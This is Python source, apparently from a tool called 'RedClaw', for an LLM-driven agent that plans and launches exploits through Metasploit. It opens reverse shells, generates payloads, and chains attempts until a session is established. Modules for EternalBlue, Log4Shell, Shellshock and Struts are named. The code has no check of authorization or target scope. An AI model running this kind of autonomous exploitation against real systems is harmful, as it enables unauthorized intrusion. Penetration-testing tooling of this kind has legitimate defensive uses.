"""
RedClaw Agents - Exploit Agent
Specialized agent for vulnerability exploitation
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime

from .base import BaseAgent, AgentCapability, AgentResult
from ..core.llm_client import RedClawLLM, Message


@dataclass
class ExploitAttempt:
    """Record of exploit attempt"""
    target: str
    vulnerability: str
    exploit_used: str
    success: bool
    session_info: Optional[Dict] = None
    timestamp: datetime = field(default_factory=datetime.now)


class ExploitAgent(BaseAgent):
    """
    Exploit Agent
    
    Specializes in:
    - Vulnerability identification
    - Exploit selection
    - Payload generation
    - Exploitation execution
    - Session establishment
    """
    
    EXPLOIT_PROMPT = """You are an exploitation specialist conducting authorized penetration testing.

Target: {target}
Vulnerability: {vulnerability}
Available exploits: {exploits}
Context: {context}

Analyze the vulnerability and plan exploitation:
1. Validate vulnerability
2. Select appropriate exploit
3. Configure payload
4. Execute and verify

Output a JSON plan:
{{
    "reasoning": "your analysis",
    "exploit": "exploit_name",
    "payload": "payload_type",
    "options": {{"RHOSTS": "target", "LHOST": "attacker"}},
    "fallback": "alternative_exploit",
    "risk_level": "low|medium|high"
}}"""

    def __init__(
        self,
        llm: RedClawLLM,
        msf_client = None,
        **kwargs
    ):
        super().__init__(
            name="ExploitAgent",
            description="Vulnerability exploitation specialist",
            llm=llm,
            capabilities=[
                AgentCapability.EXPLOIT,
                AgentCapability.VULN_SCAN
            ],
            **kwargs
        )
        
        self.msf_client = msf_client
        self.attempts: List[ExploitAttempt] = []
        
        self._register_exploit_tools()
    
    def _register_exploit_tools(self):
        """Register exploitation tools"""
        
        self.register_tool(
            "search_exploits",
            self._search_exploits,
            "Search for exploits matching vulnerability"
        )
        
        self.register_tool(
            "run_exploit",
            self._run_exploit,
            "Execute exploit against target"
        )
        
        self.register_tool(
            "generate_payload",
            self._generate_payload,
            "Generate custom payload"
        )
        
        self.register_tool(
            "validate_vuln",
            self._validate_vuln,
            "Validate vulnerability exists"
        )
        
        self.register_tool(
            "check_session",
            self._check_session,
            "Check if session was established"
        )
    
    async def plan(
        self,
        target: str,
        vulnerability: Dict,
        context: Dict = None
    ) -> Dict:
        """Create exploitation plan"""
        
        # Search for relevant exploits
        exploits = await self._search_exploits(
            query=vulnerability.get("cve", vulnerability.get("name", ""))
        )
        
        prompt = self.EXPLOIT_PROMPT.format(
            target=target,
            vulnerability=str(vulnerability),
            exploits=str(exploits.get("exploits", [])[:5]),
            context=str(context or {})
        )
        
        messages = [Message(role="user", content=prompt)]
        response = await self.llm.achat(messages, max_tokens=1024)
        
        return self._parse_plan(response.content)
    
    async def execute(
        self,
        target: str,
        vulnerability: Dict,
        lhost: str = "0.0.0.0",
        lport: int = 4444
    ) -> AgentResult:
        """Execute exploitation"""
        
        self.log(f"Starting exploitation of {target}")
        
        # Create plan
        plan = await self.plan(target, vulnerability)
        
        if not plan.get("exploit"):
            return AgentResult(
                success=False,
                data={"target": target, "vulnerability": vulnerability},
                message="No suitable exploit found",
                errors=[{"error": "No exploit identified"}]
            )
        
        # Prepare options
        options = plan.get("options", {})
        options.update({
            "RHOSTS": target,
            "LHOST": lhost,
            "LPORT": str(lport)
        })
        
        # Execute exploit
        result = await self._run_exploit(
            exploit=plan["exploit"],
            payload=plan.get("payload", "generic/shell_reverse_tcp"),
            options=options
        )
        
        # Record attempt
        attempt = ExploitAttempt(
            target=target,
            vulnerability=vulnerability.get("name", "unknown"),
            exploit_used=plan["exploit"],
            success=result.get("success", False),
            session_info=result.get("session")
        )
        self.attempts.append(attempt)
        
        # Try fallback if failed
        if not result.get("success") and plan.get("fallback"):
            self.log("Primary exploit failed, trying fallback")
            result = await self._run_exploit(
                exploit=plan["fallback"],
                payload=plan.get("payload"),
                options=options
            )
        
        return AgentResult(
            success=result.get("success", False),
            data={
                "target": target,
                "exploit": plan["exploit"],
                "session": result.get("session"),
                "output": result.get("output", "")
            },
            message=result.get("message", "Exploitation complete"),
            artifacts=[{
                "plan": plan,
                "result": result
            }]
        )
    
    # ============ Tool Implementations ============
    
    async def _search_exploits(
        self,
        query: str,
        **kwargs
    ) -> Dict:
        """Search for exploits"""
        
        # Try Metasploit if available
        if self.msf_client:
            try:
                await self.msf_client.login()
                exploits = await self.msf_client.search(query)
                return {
                    "success": True,
                    "exploits": exploits[:10],
                    "source": "metasploit"
                }
            except:
                pass
        
        # Fallback: known exploit database
        known_exploits = self._get_known_exploits(query)
        
        return {
            "success": True,
            "exploits": known_exploits,
            "source": "local_db"
        }
    
    async def _run_exploit(
        self,
        exploit: str,
        payload: str,
        options: Dict,
        **kwargs
    ) -> Dict:
        """Run exploit"""
        
        # Try Metasploit if available
        if self.msf_client:
            try:
                if not self.msf_client.token:
                    await self.msf_client.login()
                
                result = await self.msf_client.execute_exploit(
                    exploit_name=exploit,
                    payload_name=payload,
                    options=options
                )
                
                return {
                    "success": result.success,
                    "session": {"id": result.session_id} if result.session_id else None,
                    "message": result.message,
                    "output": result.output
                }
            except Exception as e:
                return {
                    "success": False,
                    "error": str(e),
                    "message": f"Metasploit error: {str(e)}"
                }
        
        # Manual/simulation mode
        return {
            "success": False,
            "message": "No exploitation engine available",
            "exploit": exploit,
            "note": "Configure Metasploit RPC for live exploitation"
        }
    
    async def _generate_payload(
        self,
        payload_type: str,
        format: str = "exe",
        options: Dict = None,
        **kwargs
    ) -> Dict:
        """Generate payload"""
        
        if self.msf_client:
            try:
                payload_bytes = await self.msf_client.generate_payload(
                    payload_name=payload_type,
                    options=options or {},
                    format=format
                )
                
                if payload_bytes:
                    return {
                        "success": True,
                        "size": len(payload_bytes),
                        "format": format
                    }
            except:
                pass
        
        return {
            "success": False,
            "message": "Payload generation requires Metasploit"
        }
    
    async def _validate_vuln(
        self,
        target: str,
        vulnerability: str,
        **kwargs
    ) -> Dict:
        """Validate vulnerability"""
        
        # Use auxiliary modules if available
        if self.msf_client:
            # Search for check modules
            pass
        
        return {
            "success": True,
            "validated": False,
            "message": "Manual validation required"
        }
    
    async def _check_session(
        self,
        **kwargs
    ) -> Dict:
        """Check for active sessions"""
        
        if self.msf_client:
            try:
                sessions = await self.msf_client.list_sessions()
                return {
                    "success": True,
                    "sessions": [
                        {
                            "id": s.session_id,
                            "type": s.session_type,
                            "target": s.tunnel_peer,
                            "platform": s.platform
                        }
                        for s in sessions
                    ]
                }
            except:
                pass
        
        return {
            "success": True,
            "sessions": []
        }
    
    def _get_known_exploits(self, query: str) -> List[Dict]:
        """Get known exploits from local database"""
        
        # Common exploit mappings
        exploit_db = {
            "ms17-010": {
                "name": "exploit/windows/smb/ms17_010_eternalblue",
                "description": "EternalBlue SMB Remote Windows Code Execution",
                "platform": "windows"
            },
            "log4j": {
                "name": "exploit/multi/http/log4shell",
                "description": "Log4j RCE (CVE-2021-44228)",
                "platform": "multi"
            },
            "cve-2021-44228": {
                "name": "exploit/multi/http/log4shell",
                "description": "Log4j RCE",
                "platform": "multi"
            },
            "shellshock": {
                "name": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
                "description": "Shellshock Bash Environment Variable Injection",
                "platform": "linux"
            },
            "struts": {
                "name": "exploit/multi/http/struts2_content_type_ognl",
                "description": "Apache Struts 2 RCE",
                "platform": "multi"
            }
        }
        
        results = []
        query_lower = query.lower()
        
        for key, exploit in exploit_db.items():
            if key in query_lower:
                results.append(exploit)
        
        return results


class ExploitChainAgent(ExploitAgent):
    """
    Extended Exploit Agent for chained exploitation
    """
    
    async def execute_chain(
        self,
        target: str,
        vulnerabilities: List[Dict]
    ) -> AgentResult:
        """Execute exploit chain"""
        
        results = []
        session = None
        
        for vuln in vulnerabilities:
            result = await self.execute(target, vuln)
            results.append(result)
            
            if result.success and result.data.get("session"):
                session = result.data["session"]
                break
        
        return AgentResult(
            success=session is not None,
            data={
                "target": target,
                "chain_results": [r.data for r in results],
                "final_session": session
            },
            message=f"Exploit chain complete. Session: {session is not None}"
        )
